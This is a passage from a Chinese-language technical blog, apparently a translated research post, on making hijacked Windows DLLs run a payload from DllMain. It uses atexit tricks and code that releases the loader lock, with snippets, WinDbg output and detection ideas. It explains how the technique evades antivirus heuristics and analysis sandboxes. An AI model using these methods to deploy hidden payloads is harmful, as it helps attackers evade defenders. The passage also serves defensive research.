(i.e. no debug symbols available) locks *snip* ...<br><br>CritSec SHELL<span class="hljs-number">32</span><span class="hljs-title">!g_lockObject</span><span class="hljs-number">+0</span> at <span class="hljs-number">00007</span>ff<span class="hljs-number">94</span>d<span class="hljs-number">3684</span>b<span class="hljs-number">0</span><br>LockCount          NOT LOCKED<br>RecursionCount     <span class="hljs-number">0</span><br>OwningThread       <span class="hljs-number">0</span><br>EntryCount         <span class="hljs-number">0</span><br>ContentionCount    <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>无论如何，有了WinDbg命令<code>!critsec ntdll!LdrpLoaderLock</code>这个神器，我们可以立马知晓Loader Lock是<code>*** Locked</code>还是<code>NOT LOCKED</code>而且在之前的<code>atexit</code>条件下其几乎可以肯定是锁上的：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-title">!critsec</span> ntdll<span class="hljs-title">!LdrpLoaderLock</span><br><br>CritSec ntdll<span class="hljs-title">!LdrpLoaderLock</span><span class="hljs-number">+0</span> at <span class="hljs-number">00007</span>ffb<span class="hljs-number">30</span>af<span class="hljs-number">65</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span><br>WaiterWoken        No<br>LockCount          <span class="hljs-number">0</span><br>RecursionCount     <span class="hljs-number">1</span><br>OwningThread       <span class="hljs-number">26e0</span><br>EntryCount         <span class="hljs-number">0</span><br>ContentionCount    <span class="hljs-number">0</span><br>*** Locked<br></code></pre></td></tr></table></figure><p><strong>那么我猜我们的这项技术是失败了，好吧，至少我们试过…</strong></p><p><strong>真失败了吗？如败！</strong>如果我告诉你(在Windows中)实际上有两种<code>atexit</code>(一个未归档的实现细节)呢！好吧，实际上这是我通过一点点的逆向工程发现的。好消息是，他们中的其中一个<strong>没有</strong>运行在Loader Lock中：</p><p><img src="/img/atexit-onexit-disassembly.png" alt="atexit-onexit-disassembly"></p><p><code>_onexit</code>是标准C的<code>atexit</code>直接传递给微软的拓展，这两个函数是等价的。</p><p>注意<code>onexit</code>函数中的两个<code>call</code>指令。第一个是调用到了<code>_crt_atexit</code>(CRT就是C运行时)，第二个是调用到<code>_register_onexit_function</code>。调用哪一个取决于在<code>jne</code>(不相等时jump)指令之后的<code>cmp</code>(比较)指令。具体来说，当地址<code>0x00007ff943783058 != 0xFFFFFFFFFFFFFFFF</code>，我们就会跳到<code>_register_onexit_function</code>，否则<code>_crt_atexit</code>会被调用。</p><p>经过实验，我意识到这是判断<code>atexit/_onexit</code>是在EXE还是DLL中被调用。如果在EXE中调用，那么对比的地址值将等于<code>0xFFFFFFFFFFFFFFFF</code>，而在DLL中就是其他的一些值。为什么会这样？我也不知道，不过事实就是这样。</p><p>于是我们已经明确了<code>atexit/_onexit</code>在DLL中实际上是调用了<code>_register_onexit_function</code>，而在EXE中调用了<code>_crt_atexit</code>。你现在也许已经猜到了，但是我们真正想调用的，那个不运行在Loader Lock之中的是——<code>_crt_atexit</code>！</p><blockquote><p><strong>CRT复习</strong></p><p>C运行时(CRT)提供了许多基本的应用程序功能，它使程序员能够访问由C(有时是c++)标准定义的函数。比如<code>malloc</code>和<code>free</code>这样的内存分配函数，用于进行进行字符串比较的<code>strcmp</code>，用于进行文件访问的<code>fopen/fread/fwrite</code>操作，等等，都是标准的C函数!遵循这个标准，开发人员(理论上)可以编写一个可以在所有平台上运行的C&#x2F; c++程序，而不需要额外的成本。</p></blockquote><p>还是回到代码再加上这个吧：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;process.h&gt;</span> <span class="hljs-comment">// 为了使用CRT的atexit函数</span></span><br><br><span class="hljs-comment">// DllMain模板文件，存在于每个DLL中</span><br>BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HINSTANCE hinstDll, DWORD fdwReason, LPVOID lpvReserved)</span><br>&#123;<br>    <span class="hljs-keyword">switch</span> (fdwReason)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-comment">// CustomPayloadFunction将在程序出口被调用</span><br>        _crt_atexit(CustomPayloadFunction);<br>        _crt_at_quick_exit(CustomPayloadFunction);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>用<code>OfflineScannerShell.exe</code>试一试结果…还是没成功</strong>。但是别急，在我自己编译的(用Visual Studio)用来进行DLL劫持测试的简单样例被劫持EXE与DLL(静态加载)上是成功的？</p><p>以下是我们的测试样例结尾通过调用<code>_crt_atexit</code>创建<code>atexit/_onexit</code>时调用栈的样子，同时证明了<strong>Loader Lock已经不复存在</strong>：</p><p><img src="/img/crt-atexit-handler-runs-without-loader-lock.png" alt="crt-atexit-handler-runs-without-loader-lock"></p><p><em><code>ConsoleApplication2</code> 是我们的目标样例EXE ，<code>Dll2</code> 是我们目标样例的劫持DLL</em></p><p>我已经有了一个直觉，在WinDbg快速瞟的这一眼更是指引了我正确方向。问题出在<code>OfflineScannerShell.exe</code>与我们的劫持DLL链接到了完全不同的CRT中，导致于没有分享同一个状态。<code>OfflineScannerShell.exe</code>链接到的是元老级的<code>msvcrt.dll</code>(这东西在Windows中向后兼容好几年了)，而我们的DLL链接到的是新的通用(Universal)CRT(UCRT)，从Windows10开始的内置系统库才可用。这是Visual Studio 2022的情况。然而，注意老版本的Visual Studio默认还是链接到Visual C++(<code>vcruntime</code>)CRT的。你可能对这个安装程序很熟悉：</p><p><img src="/img/visual-c++-redistributable-installer.png" alt="visual-c++-redistributable-installer"></p><p><img src="/img/visual-c++-redistributable-installed.png" alt="visual-c++-redistributable-installed"></p><p><strong><code>msvcrt.dll</code>是Windows中老版本的C运行时。存在于Windows95之后的内置系统库而且现在依然存在于现代Windows安装的<code>C:\Windows\System32</code>中</strong>。在配合C标准CRT方面，它提供了一个糟糕的缺陷。它实在太破旧了，事实上，微软早在很久之前就移除了开发者使用Visual Studio链接到它的能力。然而，微软自身在意识到他们自己的bug之后，结果还是在许多Windows的附带程序中链接到它身上(除非是纯粹的Win32程序，不带CRT或是使用更新的Windows 10发布的UCRT)。这一切都符合微软向后兼容之王的称号。而这就是问题所在，要查看<a href="https://stackoverflow.com/a/36189986">完整背景故事</a>，请自行承担风险。</p><p>回到<code>DllMain</code>中，使用标准的<code>GetModuleHandle/GetProcAddress</code>方法来定位并调用<code>msvcrt.dll</code>中的<code>atexit</code>是可以的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C">msvcrtHandle = GetModuleHandle(<span class="hljs-string">L&quot;msvcrt&quot;</span>);<br><span class="hljs-keyword">if</span> (msvcrtHandle == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span>;<br>FARPROC msvcrtAtexitAddress = GetProcAddress(msvcrtHandle, <span class="hljs-string">&quot;atexit&quot;</span>);<br><br><span class="hljs-comment">// 一个参数的函数原型</span><br><span class="hljs-comment">// 参数：一个函数指针(CustomPayloadFunction)，其返回类型应为无关紧要(`void`)且没有参数(又一个`void`)</span><br><span class="hljs-comment">// 这两个函数都使用被称为“cdecl”的标准C调用约定</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">int</span><span class="hljs-params">(__cdecl* msvcrtAtexitType)</span><span class="hljs-params">(<span class="hljs-type">void</span> (__cdecl*)(<span class="hljs-type">void</span>))</span>;<br><br><span class="hljs-comment">// 转换 msvcrtAtexitAddress 为 msvcrtAtexitType 类型使我们可像上面的原型对其进行调用</span><br>msvcrtAtexitType msvcrtAtexit = (msvcrtAtexitType)(msvcrtAtexitAddress);<br><br><span class="hljs-comment">// 调用 MSVCRT atexit!</span><br>msvcrtAtexit(CustomPayloadFunction);<br></code></pre></td></tr></table></figure><p>但是这太长了，而且杀软大概率不会喜欢这些函数的，我们能否将其变得更加简洁呢？当然能，只不过我们必须从Visual Studio中脱离并使用特定版本的Windows Driver Kit(WDK)进行编译。使用WDK(尽管它的名字这么叫，但它也能用来编译常规用户模式的程序)，我们可以<strong>直接</strong>链接至<code>msvcrt.dll</code>！用MinGW编译似乎也能达到效果。这将我们<code>DllMain</code>的内容(模板之外部分)变回了一行代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C">atexit(CustomPayloadFunction);<br></code></pre></td></tr></table></figure><p>现在简洁多了。</p><h4 id="启发式检测方法-1"><a href="#启发式检测方法-1" class="headerlink" title="启发式检测方法"></a>启发式检测方法</h4><p>因为只有一行代码，这项技术没有留给启发式检测太多方法。<code>atext</code>完全在进程内工作，意味着内核回调没法找到任何东西。我同样不能马上想起任何hook了<code>ntdll.dll/kernal32.dll</code>(起码不是CRT DLLs)之外的用户模式调用的安全产品。用户模式的hooks存在于程序的(虚拟)内存中，使得绕过杀软总是可能的。不像内核回调，运行在用户模式下的程序没有权限接触到内核(存在着严格的安全边界需要权限提升漏洞)。因此，该项技术直至行业普遍技术指标进步之前都会是免杀的。</p><p>使用静态扫描来检测<code>atexit</code>(或者<code>_onexit</code>)而不是<code>DllMain</code>可能一开始会有用。然而，这只会导致猫和老鼠似的你抓我藏的游戏，而且十分容易被绕过。举个例子，一名攻击者可能在DLL代码中的任何地方调用<code>atexit</code>(在<code>DllMain</code>之外，在未使用的代码中)，在大马中发出一个唯一标识符(例如汇编指令的<code>db</code>)，再使用<strong>egg hunter</strong>(一般用在漏洞利用开发，但也可能用在此环境中逃避检测)搜索该标识符以及<code>atext</code>的地址。只需要一小段汇编动态来调用这个地址所，可能存储在一个寄存器中(例如 call rax)。</p><p>当然，<code>atexit</code>自身根本没什么可怀疑的(比如在导入地址表IAT里)，不像<code>CreateRemoteThread</code>这样明显的反例。</p><p>一种启发式检测的方法是检测进程中是否有在<code>atexit</code>函数中待了异常久的时间。那么如果启发式检测发现一个良性应用在<code>atexit</code>中花了过多的时间，我们不妨将其当作纯纯的奖励，因为这于我听起来是个bug。这可以与检测CRT<code>_onexit_table_t</code>表中指向DLL代码的条目相结合。特别是在执行DLL的<code>atexit</code>处理程序期间使用了敏感的Win32函数(用内核回调来检测这一点)。</p><p><strong>还有一个有趣的发现就是<code>atexit</code>可以用来确保攻击者的真正payload在恶意文件分析沙箱环境下永远不被执行</strong>，如果沙盒中没有运行与样本DLL目标程序链接到同一个CRT的程序(EXE)的话(比如MSVCRT之于<code>OfflineScannerShell.exe</code>)。恶意文件分析服务比如 <a href="https://www.hybrid-analysis.com/">Hybrid Analysis</a> 会<strong>保证DLL样本起码在UCRT与MSVCRT环境下都运行过来避免被反沙箱绕过。</strong></p><p>虽然我们可以进一步改进对此独特技术的识别，但我认为还是将精力花在检测更广泛的DLL劫持上比较好，我们稍后再讨论这个问题。</p><h4 id="微软官方许可？"><a href="#微软官方许可？" class="headerlink" title="微软官方许可？"></a>微软官方许可？</h4><p>通过在<code>msvcrt!atexit</code>处设置断点，我得以发现微软自己的典型地运行在Loader Lock下的EXE们对同一个CRT下的<code>atexit</code>的调用：</p><p><img src="/img/microsoft-calls-crt-atexit-under-loader-lock.png" alt="microsoft-calls-crt-atexit-under-loader-lock"></p><p>所以这就说明，基本上…</p><blockquote><p><strong>微软许可了</strong></p><p>我们都已经用在产品里了。😎</p></blockquote><p>好吧好吧，虽然这里有Loader Lock，但在CRT DLL中调用CRT<code>atexit</code>与从其他DLL中调用CRT<code>atexit</code>还是有很明显的区别的。别人可以向我们的DLL调用<code>FreeLibrary</code>，使我们的<code>atexit</code>处理程序湮灭在内存中但依旧被CRT引用。这个垂悬指针会在之后退出时造成崩溃。</p><p>然而这个问题比我们想得要小得多。事实是，对于静态加载的DLL，<code>FreeLibrary</code>只能减少库的引用数而非真的从内存中卸载它，哪怕明确地释放许多次(经测试验证)。想要做到真正释放我们的DLL也是可能的，开发人员有可能通过调用<code>LdrUnloadDll</code>(一个NTDLL导出函数)来触发实际的库资源清理，尽管这种可能性不大。但是，为了防止这种事发生，我们将在我们的DLL中调用<code>LdrAddRefDll</code>(也是NTDLL的导出函数)，因为加载器在一个库的引用数非零的时候不会卸载它。调用<code>LdrAddRefDll</code>同时避免了动态加载的库(用<code>LoadLibrary</code>)被<code>FreeLibrary</code>清除了库资源。总之，只要你加上了<code>LdrAddRefDll</code>(并且你的EXE链接到了正确的CRT；否则是没用的)，这项技术便能够保证<strong>100%的安全度</strong>。</p><h3 id="破解Loader-Lock"><a href="#破解Loader-Lock" class="headerlink" title="破解Loader Lock"></a>破解Loader Lock</h3><p>好的，我们以上做的都很好。只不过如果我就是想<em>直接</em>在<code>DllMain</code>中运行我们的最终payload怎么办？事不宜迟，我现在要说的是还在<code>DllMain</code>中就破解Loader Lock。那个时候，只要我们想，在<code>DllMain</code>还在调用栈中我们就可以对其为所欲为。要完成这一壮举，我们得对Windows加载器(包含在<code>ntdll.dll</code>中)做一些逆向工程，在几个小时的WinDbg后我搞明白了。</p><p>从我们先前完成的技术研究，我们已经知道想要更改Loader Lock的状态，我们必须更改位于<code>ntdll!LdrpLoaderLock</code>的critical section。但是在不知道<code>ntdll!LdrpLoaderLock</code>符号地址的情况下我们是没法做到的，而且在调试器之外我们也不可能知道符号的地址(微软的调试符号是自动下载的)。技术上来说，提前将当前微软二进制文件的调试符号下载，并且让我们的进程加载符号，之后再在进程中寻找调试符号的地址是可行的。但是这太复杂了，而且对我而言不算是能接受的解法。</p><p>在网上搜索有关Loader Lock的critical section的信息，我正好在ReactOS的源代码中发现了一个看起来很有希望的函数叫<a href="https://doxygen.reactos.org/d7/d55/ldrapi_8c.html#a9a1888c43c98f9fc4303c2b50dc5047d">LdrUnlockLoaderLock</a>。ReactOS是对微软Windows系统进行的从头开始的逆向工程而来的对Windows的重实现，所以不用说，它们是无价之宝。</p><p>使用<code>dumpbin.exe /exports C:\Windows\System32\ntdll.dll</code>(<code>dumpbin.exe</code>是与Visual Studio一起安装的一款工具)，我确认了<code>LdrUnlockLoaderLock</code>确实是<code>ntdll.dll</code>的一个导出函数，意味着我可以通过静态链接或者<code>GetProcAddress</code>很容易地获取它的地址，然后大概调用它来破解Loader Lock！</p><p>看一眼ReactOS源代码里<code>LdrUnlockLoader</code>的函数定义，看起来需要一个<code>Cookie</code>参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C">NTSTATUS NTAPI <span class="hljs-title function_">LdrUnlockLoaderLock</span> <span class="hljs-params">( IN ULONG Flags,</span><br><span class="hljs-params">                                     IN ULONG Cookie OPTIONAL</span><br><span class="hljs-params">    )</span><br></code></pre></td></tr></table></figure><p>而且如果我们没有提供<code>Cookie</code>，函数会提前返回：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/* If we don&#x27;t have a cookie, just return */</span><br><span class="hljs-keyword">if</span> (!Cookie) <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br></code></pre></td></tr></table></figure><p><code>Cookie</code>(只是个不被储存的魔数[Magic Number])是基于线程ID(通过<code>GetCurrentThreadId</code>或者直接从TEB中检索得)来计算得到的，说明我们理论上可以靠我们自己轻易创建一个有效的cookie。</p><p>不幸的是，事情并没有这么简单，经过我的分析，看起来 <strong>某个微软员工故意(但是如此巧妙)破坏了<code>LdrUnlockLoaderLock</code></strong> 使得任何标准的4位十六进制的线程ID(比如0xffff)不可能通过验证步骤。分析过程十分的深入，所以我会将其留在Github的仓库好让任何想亲自验证我的结论的人使用。注意ReactOS对标的是Winodows Server 2003(还支持部分Windows7+的API)，然而<code>LdrUnlockLoaderLock</code>的代码显然在新版本的Windows中被改动了。</p><p>某个微软的开发人员或许是因为作为NTDLL的导出函数太容易被接触可能会导致某些代码菜鸟滥用所以把这个函数有意破坏了。不过这确实说得通。通过在<code>LdrUnlockLoadLock</code>设置断点，我发现在我们的目标程序运行周期中该函数从未被调用过。真正在我们的程序中被调用的，还有在<code>LdrUnlockLoaderLock</code>的反汇编中调用的是另外一个名叫：<code>LdrpReleaseLoaderLock</code>的小函数。</p><p>看一眼这家伙的代码，我有预感我们会相处得很好！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">lea     rcx, [ntdll!LdrpLoaderLock (7ff94e1765c8)]<br>call    ntdll!RtlLeaveCriticalSection (7ff94e03f230)<br></code></pre></td></tr></table></figure><p><code>LdrpReleaseLoaderLock </code>不是NTDLL的导出函数，所以为了拿到它，我们要从已知调用<code>LdrReleaseLoaderLock</code>的导出函数的反汇编中搜索提取它的地址。使用 <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/---search-for-disassembly-pattern-">WinDbg 命令 # </a> 我们可以在NTDLL的汇编代码中搜索模式(patterns)：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>:<span class="hljs-number">000</span>&gt; # <span class="hljs-string">&quot;call    ntdll!LdrpReleaseLoaderLock&quot;</span> &lt;NTDLL_ADDRESS&gt; L9999999<br><span class="hljs-attribute">ntdll</span>!LdrpDecrementModuleLoadCountEx+<span class="hljs-number">0</span>x79:<br><span class="hljs-attribute">00007ff9</span>&#x27;<span class="hljs-number">4</span>e01fd11 e84ee90200      call    ntdll!LdrpReleaseLoaderLock (<span class="hljs-number">00007</span>ff9&#x27;<span class="hljs-number">4</span>e04e664)<br><span class="hljs-attribute">ntdll</span>!LdrShutdownThread+<span class="hljs-number">0</span>x201:<br><span class="hljs-attribute">00007ff9</span>&#x27;<span class="hljs-number">4</span>e027651 e80e700200      call    ntdll!LdrpReleaseLoaderLock (<span class="hljs-number">00007</span>ff9&#x27;<span class="hljs-number">4</span>e04e664)<br><span class="hljs-attribute">ntdll</span>!LdrpInitializeThread+<span class="hljs-number">0</span>x213:<br><span class="hljs-attribute">00007ff9</span>&#x27;<span class="hljs-number">4</span>e02794 b e8146d0200      call    ntdll!LdrpReleaseLoaderLock (<span class="hljs-number">00007</span>ff9&#x27;<span class="hljs-number">4</span>e04e664)<br><span class="hljs-attribute">ntdll</span>!LdrpPrepareModuleForExecution+<span class="hljs-number">0</span>xc9:<br><span class="hljs-attribute">00007ff9</span>&#x27;<span class="hljs-number">4</span>e04d951 e80e0d0000      call    ntdll!LdrpReleaseLoaderLock (<span class="hljs-number">00007</span>ff9&#x27;<span class="hljs-number">4</span>e04e664)<br><span class="hljs-attribute">ntdll</span>!LdrEnumerateLoadedModules+<span class="hljs-number">0</span>x85:<br><span class="hljs-attribute">00007ff9</span>`<span class="hljs-number">4</span>e06d955 e80a0dfeff      call    ntdll!LdrpReleaseLoaderLock (<span class="hljs-number">00007</span>ff9`<span class="hljs-number">4</span>e04e664)<br><span class="hljs-attribute">ntdll</span>!LdrUnlockLoaderLock+<span class="hljs-number">0</span>x63:<br><span class="hljs-attribute">00007ff9</span>`<span class="hljs-number">4</span>e08e023 e83c06fcff      call    ntdll!LdrpReleaseLoaderLock (<span class="hljs-number">00007</span>ff9`<span class="hljs-number">4</span>e04e664)<br><span class="hljs-attribute">ntdll</span>!LdrUnlockLoaderLock+<span class="hljs-number">0</span>x71:<br><span class="hljs-attribute">00007ff9</span>`<span class="hljs-number">4</span>e08e031 e82e06fcff      call    ntdll!LdrpReleaseLoaderLock (<span class="hljs-number">00007</span>ff9`<span class="hljs-number">4</span>e04e664)<br><span class="hljs-attribute">ntdll</span>!LdrShutdownThread$fin$<span class="hljs-number">2</span>+<span class="hljs-number">0</span>x10:<br><span class="hljs-attribute">00007ff9</span>&#x27;<span class="hljs-number">4</span>e0b4ac7 e8989bf9ff      call    ntdll!LdrpReleaseLoaderLock (<span class="hljs-number">00007</span>ff9&#x27;<span class="hljs-number">4</span>e04e664)<br><span class="hljs-attribute">ntdll</span>!LdrpInitializeThread$fin$<span class="hljs-number">2</span>+<span class="hljs-number">0</span>x10:<br><span class="hljs-attribute">00007ff9</span>&#x27;<span class="hljs-number">4</span>e0b4b2f e8309bf9ff      call    ntdll!LdrpReleaseLoaderLock (<span class="hljs-number">00007</span>ff9&#x27;<span class="hljs-number">4</span>e04e664)<br><span class="hljs-attribute">ntdll</span>!LdrEnumerateLoadedModules$fin$<span class="hljs-number">0</span>+<span class="hljs-number">0</span>x10:<br><span class="hljs-attribute">00007ff9</span>&#x27;<span class="hljs-number">4</span>e0b59f5 e86a8cf9ff      call    ntdll!LdrpReleaseLoaderLock (<span class="hljs-number">00007</span>ff9&#x27;<span class="hljs-number">4</span>e04e664)<br><span class="hljs-attribute">ntdll</span>!RtlExitUserProcess+<span class="hljs-number">0</span>x5f3c1:<br><span class="hljs-attribute">00007ff9</span>&#x27;<span class="hljs-number">4</span>e0ccda1 e8be18f8ff      call    ntdll!LdrpReleaseLoaderLock (<span class="hljs-number">00007</span>ff9&#x27;<span class="hljs-number">4</span>e04e664)<br><span class="hljs-attribute">ntdll</span>!LdrpInitializeImportRedirection+<span class="hljs-number">0</span>x46d72:<br><span class="hljs-attribute">00007ff9</span>&#x27;<span class="hljs-number">4</span>e0d8976 e8e95cf7ff      call    ntdll!LdrpReleaseLoaderLock (<span class="hljs-number">00007</span>ff9&#x27;<span class="hljs-number">4</span>e04e664)<br><span class="hljs-attribute">ntdll</span>!LdrInitShimEngineDynamic+<span class="hljs-number">0</span>xde:<br><span class="hljs-attribute">00007ff9</span>`<span class="hljs-number">4</span>e0e068e e8d1dff6ff      call    ntdll!LdrpReleaseLoaderLock (<span class="hljs-number">00007</span>ff9`<span class="hljs-number">4</span>e04e664)<br><span class="hljs-attribute">ntdll</span>!LdrpInitializeProcess+<span class="hljs-number">0</span>x1f6e:<br><span class="hljs-attribute">00007ff9</span>&#x27;<span class="hljs-number">4</span>e0e3e2e e831a8f6ff      call    ntdll!LdrpReleaseLoaderLock (<span class="hljs-number">00007</span>ff9&#x27;<span class="hljs-number">4</span>e04e664)<br><span class="hljs-attribute">ntdll</span>!LdrpCompleteProcessCloning+<span class="hljs-number">0</span>x93:<br><span class="hljs-attribute">00007ff9</span>`<span class="hljs-number">4</span>e0e4bfb e8649af6ff      call    ntdll!LdrpReleaseLoaderLock (<span class="hljs-number">00007</span>ff9`<span class="hljs-number">4</span>e04e664)<br></code></pre></td></tr></table></figure><p>如你所见，存在着多个潜在的定位<code>ntdll!LdrpReleaseLoaderLock</code>的着手点。 然而我们已经知道了<code>ntdll!LdrUnlockLoaderLock</code>是导出函数，而且看起来这是最直接的接近方法，所以从这里开始搜索。这部分的代码没什么特别的；只是搜索正确的调用操作数，执行一些额外的验证，提取执行调用指令的地址(rel32形式)，接着声明<code>LdrpReleaseLoaderLock</code>函数原型以便我们调用。我进一步从<code>LdrpReleaseLoaderLock</code>提取了<code>ntdll!LdrpLoaderLock</code>的critical section的地址，让我们可以在<code>DllMain</code>返回之前再锁上Loader Lock(通过<code>EnterCriticalSection</code>)以确保安全性。请随意来我的GitHub仓库查看完整代码！现在，让我们在<code>DllMain</code>中检查一下…</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>:<span class="hljs-number">000</span>&gt; !critsec ntdll!LdrpLoaderLock<br><br><span class="hljs-attribute">CritSec</span> ntdll!LdrpLoaderLock+<span class="hljs-number">0</span> at <span class="hljs-number">00007</span>ff94e1765c8<br><span class="hljs-attribute">LockCount</span>          NOT LOCKED<br><span class="hljs-attribute">RecursionCount</span>     <span class="hljs-number">0</span><br><span class="hljs-attribute">OwningThread</span>       <span class="hljs-number">0</span><br><span class="hljs-attribute">EntryCount</span>         <span class="hljs-number">0</span><br><span class="hljs-attribute">ContentionCount</span>    <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>可以看到我们成功在<code>DllMain</code>中解锁了Loader Lock，让我们尝试调用<code>ShellExecute</code>来打开<code>calc.exe</code>！然后…还是没成功。但我们已经有了十分可人的进展！回想一下<a href="#%E6%88%91%E4%BB%AC%E7%9A%84Payload">我们的Payload</a>一节中我们本来还是会在<code>ntdll!NtAlpcSendWaitReceivePort</code>遭遇死锁的：</p><p><img src="/img/shellexecute-initial-deadlock-point-stack-trace.png" alt="shellexecute-initial-deadlock-point-stack-trace"></p><p>随着Loader Lock的释放，我们已经超越了之前的自己，来到了我们面前的下一个障碍：</p><p><img src="/img/shellexecute-deadlock-main-thread-creates-new-thread.png" alt="shellexecute-deadlock-main-thread-creates-new-thread"></p><p><img src="/img/shellexecute-deadlock-new-thread-loader.png" alt="shellexecute-deadlock-new-thread-loader"></p><p>还记得<code>ShellExecute</code>是怎么生成一个新线程的吗？可以看到现在线程已经成功被生成了，但是它的加载器正尝试加载更多库，与主程序刚启动时类似。</p><p>要解决这个问题得不停地试错。每当程序挂起，我就将挂起的部分更改让程序运行得更远一点，反反复复。</p><p>要生成一个新线程，本质上跟这两件事有关：</p><ul><li>Win32事件<ul><li>使用<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/synchapi/nf-synchapi-setevent">SetEvent</a>将事件设置为信号状态</li><li>如果事件未被设置为信号状态，那么新线程会在<code>NtWaitForSingleObject</code>永远挂起</li></ul></li><li>加载器的工作锁：<code>ntdll!LdrpWorkInProgress</code><ul><li>这不是critical section或者事件；就只是ntdll.dll内存中的一个1或0</li><li>在当前线程直接&#x2F;间接发起的每种加载器工作中，该锁似乎都位于锁层次结构的顶部！</li><li>将其置0(<code>FALSE</code>)将运行被当前线程创建的线程进行加载工作，同时阻止加载工作发生在程序中的其他线程中(这对防止死锁&#x2F;崩溃很重要)</li></ul></li></ul><p>我们可以使用这个WinDbg命令来列出所有Win32事件：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; !handle <span class="hljs-number">0</span> <span class="hljs-number">8</span> <span class="hljs-keyword">Event</span><br>Handle <span class="hljs-number">4</span><br>  <span class="hljs-type">Object</span> Specific Information<br>    <span class="hljs-keyword">Event</span> Type Manual Reset<br>    <span class="hljs-keyword">Event</span> <span class="hljs-built_in">is</span> Waiting<br>Handle c<br>  <span class="hljs-type">Object</span> Specific Information<br>    <span class="hljs-keyword">Event</span> Type <span class="hljs-keyword">Auto</span> Reset<br>    <span class="hljs-keyword">Event</span> <span class="hljs-built_in">is</span> Waiting<br>Handle <span class="hljs-number">3</span>c<br>  <span class="hljs-type">Object</span> Specific Information<br>    <span class="hljs-keyword">Event</span> Type <span class="hljs-keyword">Auto</span> Reset<br>    <span class="hljs-keyword">Event</span> <span class="hljs-built_in">is</span> <span class="hljs-keyword">Set</span><br>Handle <span class="hljs-number">40</span><br>  <span class="hljs-type">Object</span> Specific Information<br>    <span class="hljs-keyword">Event</span> Type <span class="hljs-keyword">Auto</span> Reset<br>    <span class="hljs-keyword">Event</span> <span class="hljs-built_in">is</span> Waiting<br>Handle b0<br>  <span class="hljs-type">Object</span> Specific Information<br>    <span class="hljs-keyword">Event</span> Type <span class="hljs-keyword">Auto</span> Reset<br>    <span class="hljs-keyword">Event</span> <span class="hljs-built_in">is</span> Waiting<br>... *snip* More events *snip* ...<br><span class="hljs-number">13</span> <span 